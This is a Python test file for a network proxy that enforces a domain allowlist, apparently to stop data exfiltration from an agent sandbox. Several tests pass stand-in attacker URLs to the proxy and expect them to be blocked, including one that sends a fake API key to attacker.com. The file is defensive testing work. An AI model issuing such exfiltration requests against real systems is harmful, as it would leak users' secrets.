"""
Tests for Network Proxy.

Tests network isolation and domain filtering:
- Domain whitelist validation
- Request blocking
- Request logging
- Monkey-patching mode

Goal: Verify network isolation prevents data exfiltration.
"""

import pytest
import sys
from pathlib import Path

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from skills.execution.network_proxy import (
    NetworkProxy,
    MonkeyPatchedNetworkProxy,
    create_default_proxy,
    NetworkLog
)


class TestNetworkProxy:
    """Test network proxy functionality."""

    def test_create_default_proxy(self):
        """Test creating proxy with default settings."""
        proxy = create_default_proxy()

        assert proxy is not None
        assert len(proxy.allowed_domains) > 0
        assert "api.anthropic.com" in proxy.allowed_domains

    def test_allowed_domain_detection(self):
        """Test that allowed domains are correctly detected."""
        proxy = NetworkProxy(allowed_domains=["example.com", "test.org"])

        # Exact match
        is_allowed, reason = proxy.is_domain_allowed("https://example.com/page")
        assert is_allowed
        assert reason is None

        # Subdomain match
        is_allowed, reason = proxy.is_domain_allowed("https://sub.example.com/page")
        assert is_allowed

        # Different domain
        is_allowed, reason = proxy.is_domain_allowed("https://evil.com/steal")
        assert not is_allowed
        assert "not in allowed list" in reason

    def test_blocked_domain(self):
        """Test that blocked domains raise PermissionError."""
        proxy = NetworkProxy(allowed_domains=["example.com"])

        with pytest.raises(PermissionError) as exc_info:
            proxy.fetch("https://evil.com/data")

        assert "blocked" in str(exc_info.value).lower()
        assert "evil.com" in str(exc_info.value)

    def test_request_logging(self):
        """Test that requests are logged."""
        proxy = NetworkProxy(
            allowed_domains=["example.com"],
            log_requests=True
        )

        # Try allowed domain (won't actually fetch, but will log)
        try:
            proxy.fetch("https://example.com/test")
        except:
            pass  # Network error is okay, we're testing logging

        # Try blocked domain
        try:
            proxy.fetch("https://evil.com/test")
        except PermissionError:
            pass

        # Check logs
        logs = proxy.get_log()
        assert len(logs) >= 1

        # Find the blocked request log
        blocked_logs = [log for log in logs if not log["allowed"]]
        assert len(blocked_logs) >= 1
        assert "evil.com" in blocked_logs[0]["url"]

    def test_clear_log(self):
        """Test clearing request log."""
        proxy = NetworkProxy(allowed_domains=["example.com"])

        # Make some requests
        try:
            proxy.fetch("https://blocked.com/test")
        except:
            pass

        # Verify log has entries
        assert len(proxy.get_log()) > 0

        # Clear log
        proxy.clear_log()

        # Verify log is empty
        assert len(proxy.get_log()) == 0

    def test_add_allowed_domain(self):
        """Test adding domains to whitelist."""
        proxy = NetworkProxy(allowed_domains=["example.com"])

        # Initially blocked
        is_allowed, _ = proxy.is_domain_allowed("https://newdomain.com/test")
        assert not is_allowed

        # Add domain
        proxy.add_allowed_domain("newdomain.com")

        # Now allowed
        is_allowed, _ = proxy.is_domain_allowed("https://newdomain.com/test")
        assert is_allowed

    def test_remove_allowed_domain(self):
        """Test removing domains from whitelist."""
        proxy = NetworkProxy(allowed_domains=["example.com", "remove-me.com"])

        # Initially allowed
        is_allowed, _ = proxy.is_domain_allowed("https://remove-me.com/test")
        assert is_allowed

        # Remove domain
        proxy.remove_allowed_domain("remove-me.com")

        # Now blocked
        is_allowed, _ = proxy.is_domain_allowed("https://remove-me.com/test")
        assert not is_allowed

    def test_url_parsing(self):
        """Test URL parsing handles various formats."""
        proxy = NetworkProxy(allowed_domains=["example.com"])

        # Different URL formats
        test_cases = [
            ("https://example.com", True),
            ("https://example.com/", True),
            ("https://example.com/path", True),
            ("https://example.com:443/path", True),
            ("https://sub.example.com", True),
            ("http://example.com", True),  # HTTP also works
            ("https://notexample.com", False),
            ("https://example.com.evil.com", False),
        ]

        for url, expected_allowed in test_cases:
            is_allowed, _ = proxy.is_domain_allowed(url)
            assert is_allowed == expected_allowed, f"Failed for {url}"

    def test_anthropic_domains_allowed(self):
        """Test that Anthropic domains are allowed by default."""
        proxy = create_default_proxy()

        anthropic_urls = [
            "https://api.anthropic.com/v1/messages",
            "https://api.anthropic.com/v1/complete",
        ]

        for url in anthropic_urls:
            is_allowed, reason = proxy.is_domain_allowed(url)
            assert is_allowed, f"{url} should be allowed"

    def test_package_repository_domains(self):
        """Test that package repos are allowed by default."""
        proxy = create_default_proxy()

        repo_urls = [
            "https://pypi.org/simple/",
            "https://github.com/anthropics/claude-code",
            "https://files.pythonhosted.org/packages/...",
        ]

        for url in repo_urls:
            is_allowed, reason = proxy.is_domain_allowed(url)
            assert is_allowed, f"{url} should be allowed"


class TestMonkeyPatchedProxy:
    """Test monkey-patched proxy mode."""

    def test_context_manager(self):
        """Test that proxy works as context manager."""
        proxy = MonkeyPatchedNetworkProxy(allowed_domains=["example.com"])

        with proxy:
            # Inside context, proxy should be active
            assert proxy._original_urlopen is not None

        # Outside context, original should be restored
        # (Can't easily test without actually calling urlopen)

    def test_monkey_patching_blocks_requests(self):
        """Test that monkey patching blocks unauthorized requests."""
        import urllib.request

        proxy = MonkeyPatchedNetworkProxy(allowed_domains=["example.com"])

        with proxy:
            # This should be blocked
            with pytest.raises(PermissionError):
                urllib.request.urlopen("https://evil.com/steal")

    def test_monkey_patching_logs_requests(self):
        """Test that monkey patching logs requests."""
        import urllib.request

        proxy = MonkeyPatchedNetworkProxy(
            allowed_domains=["example.com"],
            log_requests=True
        )

        with proxy:
            # Try blocked request
            try:
                urllib.request.urlopen("https://blocked.com/test")
            except PermissionError:
                pass

        # Check logs
        logs = proxy.get_log()
        assert len(logs) > 0
        assert any("blocked.com" in log["url"] for log in logs)


class TestSecurityScenarios:
    """Test security scenarios and edge cases."""

    def test_data_exfiltration_blocked(self):
        """Test that data exfiltration attempts are blocked."""
        proxy = NetworkProxy(allowed_domains=["api.anthropic.com"])

        # Simulate trying to send sensitive data to unauthorized domain
        sensitive_data = "API_KEY=sk-ant-123456"

        with pytest.raises(PermissionError) as exc_info:
            proxy.fetch(f"https://attacker.com/steal?data={sensitive_data}")

        error_msg = str(exc_info.value)
        assert "blocked" in error_msg.lower()
        assert "attacker.com" in error_msg

    def test_subdomain_confusion(self):
        """Test that subdomain confusion attacks are prevented."""
        proxy = NetworkProxy(allowed_domains=["example.com"])

        # These should NOT be allowed
        malicious_urls = [
            "https://example.com.evil.com",  # Evil domain with example.com prefix
            "https://notexample.com",  # Similar but different domain
            "https://exampleXcom",  # Typo domain
        ]

        for url in malicious_urls:
            is_allowed, _ = proxy.is_domain_allowed(url)
            assert not is_allowed, f"{url} should be blocked"

    def test_port_manipulation(self):
        """Test that port manipulation doesn't bypass filtering."""
        proxy = NetworkProxy(allowed_domains=["example.com"])

        # Port should be stripped when checking domain
        is_allowed, _ = proxy.is_domain_allowed("https://example.com:443/test")
        assert is_allowed

        is_allowed, _ = proxy.is_domain_allowed("https://example.com:8080/test")
        assert is_allowed

        # But wrong domain with port should still be blocked
        is_allowed, _ = proxy.is_domain_allowed("https://evil.com:443/test")
        assert not is_allowed


class TestNetworkLog:
    """Test network logging functionality."""

    def test_log_entry_structure(self):
        """Test that log entries have correct structure."""
        proxy = NetworkProxy(allowed_domains=["example.com"], log_requests=True)

        # Make request (will fail but log)
        try:
            proxy.fetch("https://blocked.com/test")
        except:
            pass

        logs = proxy.get_log()
        assert len(logs) > 0

        log = logs[0]
        assert "timestamp" in log
        assert "url" in log
        assert "allowed" in log
        assert "reason" in log or log["allowed"]

    def test_log_contains_denial_reason(self):
        """Test that blocked requests log the reason."""
        proxy = NetworkProxy(allowed_domains=["example.com"], log_requests=True)

        try:
            proxy.fetch("https://evil.com/test")
        except PermissionError:
            pass

        logs = proxy.get_log()
        blocked_logs = [log for log in logs if not log["allowed"]]

        assert len(blocked_logs) > 0
        assert blocked_logs[0]["reason"] is not None
        assert "not in allowed list" in blocked_logs[0]["reason"]


def run_network_proxy_tests():
    """Run all network proxy tests."""
    pytest.main([__file__, "-v"])


if __name__ == "__main__":
    run_network_proxy_tests()
